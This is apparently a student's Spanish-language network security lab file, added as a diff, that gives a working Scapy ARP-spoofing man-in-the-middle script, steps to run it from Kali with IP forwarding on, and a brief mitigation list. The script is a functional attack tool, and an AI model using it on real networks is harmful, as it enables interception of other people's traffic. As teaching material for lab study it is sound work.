@@ -1,0 +1,87 @@
+Laboratorio de Seguridad en Redes
+Ataque MITM mediante ARP Spoofing
+Escenario: Router c7200 (10.24.62.1/24), Kali Linux atacante (10.24.62.2/24),
+y máquina víctima (10.24.62.3/24) conectados a través de un switch en GNS3.
+Autor: Gregory
+Matrícula: [2024-1462]
+"""
+
+from scapy.all import *
+import time
+
+# Configuración de IPs en el laboratorio
+victim_ip = "10.24.62.3"   # Máquina víctima
+router_ip = "10.24.62.1"   # Router
+attacker_ip = "10.24.62.2" # Kali (no se usa directamente, pero se documenta)
+
+def get_mac(ip):
+    """
+    Obtiene la dirección MAC de un host enviando un ARP request.
+    """
+    ans, _ = arping(ip, timeout=2, verbose=False)
+    for s, r in ans:
+        return r[Ether].src
+    return None
+
+def spoof(target_ip, spoof_ip, target_mac):
+    """
+    Envía una respuesta ARP falsa al objetivo, indicando que la IP spoof_ip
+    está asociada a la MAC del atacante.
+    """
+    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(pkt, verbose=False)
+
+def restore(dest_ip, src_ip, dest_mac, src_mac):
+    """
+    Restaura la tabla ARP enviando la asociación correcta.
+    """
+    pkt = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+    send(pkt, count=5, verbose=False)
+
+def main():
+    print("[*] Iniciando ataque MITM mediante ARP Spoofing...")
+    victim_mac = get_mac(victim_ip)
+    router_mac = get_mac(router_ip)
+
+    if victim_mac is None or router_mac is None:
+        print("[!] No se pudieron obtener las MACs. Verifica la conectividad.")
+        return
+
+    try:
+        while True:
+            spoof(victim_ip, router_ip, victim_mac)   # Engaña a la víctima
+            spoof(router_ip, victim_ip, router_mac)   # Engaña al router
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[!] Restaurando tablas ARP...")
+        restore(victim_ip, router_ip, victim_mac, router_mac)
+        restore(router_ip, victim_ip, router_mac, victim_mac)
+        print("[*] Ataque detenido y tablas ARP restauradas.")
+
+if __name__ == "__main__":
+    main()
+Instrucciones de uso
+Guarda el archivo como arp_mitm.py en tu Kali.
+
+Activa el reenvío de paquetes:
+
+bash
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+Ejecuta el script:
+
+bash
+sudo python3 arp_mitm.py
+En la víctima, revisa la tabla ARP:
+
+bash
+arp -a
+Verás que la IP del router (10.24.62.1) apunta a la MAC de Kali.
+
+Captura tráfico en Kali con Wireshark para demostrar que pasa por tu máquina.
+
+Mitigación
+Dynamic ARP Inspection (DAI) en switches.
+
+Entradas ARP estáticas en hosts críticos.
+
+Seguridad en capa 2 para evitar ARP spoofing.
